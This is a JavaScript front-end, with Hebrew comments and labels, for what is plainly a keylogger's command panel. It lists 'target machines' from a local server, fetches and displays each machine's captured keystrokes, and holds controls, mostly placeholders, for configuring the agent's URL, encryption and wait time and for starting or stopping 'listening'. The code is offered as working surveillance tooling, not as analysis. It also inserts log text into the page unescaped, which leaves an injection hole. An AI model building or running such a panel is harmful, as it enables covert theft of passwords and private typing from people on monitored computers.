document.addEventListener('DOMContentLoaded', () => {
    const computersList = document.getElementById('computers-list');
    const logsPage = document.getElementById('logs-page');
    const homePageSections = document.querySelectorAll('.computers-section, .alerts-section, .agent-section');
    const navLinks = document.querySelectorAll('.nav-links a');
    const logComputerName = document.getElementById('log-computer-name');
    const logsList = document.getElementById('logs-list');
    const toggleAgentBtn = document.getElementById('toggle-agent-btn');

    // כתובת ה-URL של השרת
    const SERVER_URL = 'http://127.0.0.1:5000/api';

    // פונקציה לשליפת רשימת המחשבים מהשרת
    async function fetchComputers() {
        try {
            const response = await fetch(`${SERVER_URL}/get_target_machines_list`);
            if (!response.ok) {
                throw new Error('Failed to fetch computers list');
            }
            const computers = await response.json();
            renderComputers(computers);
        } catch (error) {
            console.error('Error fetching computers:', error);
            computersList.innerHTML = `<p class="error-message">שגיאה בטעינת רשימת המחשבים. נסה שוב מאוחר יותר.</p>`;
        }
    }

    // פונקציה המעדכנת את רשימת המחשבים ב-HTML
    function renderComputers(computers) {
        computersList.innerHTML = '';
        if (computers.length === 0) {
            computersList.innerHTML = `<p class="no-data-message">לא נמצאו מחשבים במערכת.</p>`;
            return;
        }
        computers.forEach(name => {
            const computerCard = document.createElement('div');
            computerCard.className = 'computer-card';
            computerCard.innerHTML = `<button class="btn computer-btn" data-computer-name="${name}">${name}</button>`;
            computersList.appendChild(computerCard);
        });
    }

    // פונקציה לשליפת הלוגים של מחשב ספציפי
    async function fetchLogs(computerName) {
        try {
            const response = await fetch(`${SERVER_URL}/get_keystrokes?machine=${computerName}`);
            if (!response.ok) {
                throw new Error('Failed to fetch logs');
            }
            const logs = await response.json();
            renderLogs(logs);
        } catch (error) {
            console.error('Error fetching logs:', error);
            logsList.innerHTML = `<p class="error-message">שגיאה בטעינת הלוגים עבור ${computerName}.</p>`;
        }
    }

    // פונקציה המציגה את הלוגים שנשלפו מהשרת
    function renderLogs(logs) {
        logsList.innerHTML = '';
        if (logs.length === 0) {
            logsList.innerHTML = `<p class="no-data-message">לא נמצאו לוגים עבור מחשב זה.</p>`;
            return;
        }
        logs.forEach(log => {
            // הנתונים מהשרת הם מחרוזות JSON, יש להמיר אותן לאובייקט
            try {
                const logObject = JSON.parse(log);
                for (const time in logObject) {
                    const logItem = document.createElement('div');
                    logItem.className = 'log-item';
                    logItem.innerHTML = `<strong>[${time}]</strong>: ${logObject[time].text}`;
                    logsList.appendChild(logItem);
                }
            } catch (e) {
                console.error("Failed to parse log JSON:", log);
                const logItem = document.createElement('div');
                logItem.className = 'log-item';
                logItem.textContent = `שגיאת עיצוב: ${log}`;
                logsList.appendChild(logItem);
            }
        });
    }

    // מעבר בין דפי המערכת
    function navigateTo(page) {
        if (page === 'home') {
            homePageSections.forEach(section => section.classList.remove('hidden'));
            logsPage.classList.add('hidden');
        } else if (page === 'logs') {
            homePageSections.forEach(section => section.classList.add('hidden'));
            logsPage.classList.remove('hidden');
        }
    }

    // טיפול בלחיצה על קישורי הניווט
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            navLinks.forEach(item => item.classList.remove('active'));
            link.classList.add('active');

            if (link.textContent === 'לוגים') {
                alert('יש לבחור מחשב כדי לראות לוגים.');
                // נשארים בעמוד הבית כדי שהמשתמש יוכל לבחור מחשב
            } else if (link.textContent === 'בית') {
                navigateTo('home');
            }
        });
    });

    // טיפול בלחיצה על כפתור מחשב
    computersList.addEventListener('click', (e) => {
        if (e.target.classList.contains('computer-btn')) {
            const computerName = e.target.getAttribute('data-computer-name');
            logComputerName.textContent = computerName;
            navigateTo('logs');
            fetchLogs(computerName); // קריאה לפונקציה ששולפת לוגים מהשרת
        }
    });

    // טיפול בניהול הסוכן (למשל, שינוי URL או הפעלה/השבתה)
    const urlInput = document.getElementById('url-input');
    const encryptionInput = document.getElementById('encryption-input');
    const waitTimeInput = document.getElementById('wait-time-input');

    // Event listeners for agent management buttons
    document.querySelector('.agent-section').addEventListener('click', (e) => {
        if (e.target.tagName === 'BUTTON' && e.target.textContent === 'שמור') {
            const parent = e.target.closest('.option-item');
            const label = parent.querySelector('label').textContent;

            // This is just a placeholder. In a real-world scenario, you would send a request to the server
            // to update these settings.
            if (parent.querySelector('input')) {
                const value = parent.querySelector('input').value;
                alert(`הגדרת "${label}" עודכנה ל: ${value}`);
                // await fetch(`${SERVER_URL}/update_agent_setting`, { ... });
            }
        }
    });

    // Event listener for agent toggle button
    toggleAgentBtn.addEventListener('click', () => {
        // This is a placeholder for a server call to start/stop the agent
        // Example: await fetch(`${SERVER_URL}/toggle_agent`, { ... });

        if (toggleAgentBtn.textContent === 'התחלת האזנה') {
            toggleAgentBtn.textContent = 'עצירת האזנה';
            toggleAgentBtn.classList.add('active');
            alert('האזנה החלה!');
        } else {
            toggleAgentBtn.textContent = 'התחלת האזנה';
            toggleAgentBtn.classList.remove('active');
            alert('האזנה הופסקה!');
        }
    });

    // בדיקות ראשוניות בטעינת הדף
    fetchComputers();
});